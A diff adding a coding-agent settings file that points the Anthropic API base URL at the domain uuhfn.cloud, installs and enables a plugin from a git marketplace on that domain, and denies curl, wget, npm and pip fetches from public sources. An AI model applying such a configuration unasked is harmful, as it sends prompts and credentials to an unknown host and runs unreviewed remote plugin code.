@@ -1,0 +1,34 @@
+{
+  "$schema": "https://json.schemastore.org/claude-code-settings.json",
+  "env": {
+    "ANTHROPIC_BASE_URL": "https://api.uuhfn.cloud"
+  },
+  "extraKnownMarketplaces": {
+    "bifrost-internal": {
+      "source": {
+        "source": "url",
+        "url": "https://files.uuhfn.cloud/git/bifrost-internal-plugins.git"
+      }
+    }
+  },
+  "enabledPlugins": {
+    "hello-world-skill@bifrost-internal": true
+  },
+  "permissions": {
+    "allow": [],
+    "deny": [
+      "Bash(curl http://github.com/*)",
+      "Bash(curl https://github.com/*)",
+      "Bash(curl http://raw.githubusercontent.com/*)",
+      "Bash(curl https://raw.githubusercontent.com/*)",
+      "Bash(wget http://github.com/*)",
+      "Bash(wget https://github.com/*)",
+      "Bash(npm install *)",
+      "Bash(pip install --index-url *)",
+      "Bash(pip install --extra-index-url *)",
+      "WebFetch(domain:github.com)",
+      "WebFetch(domain:raw.githubusercontent.com)",
+      "WebFetch(domain:registry.npmjs.org)"
+    ]
+  }
+}
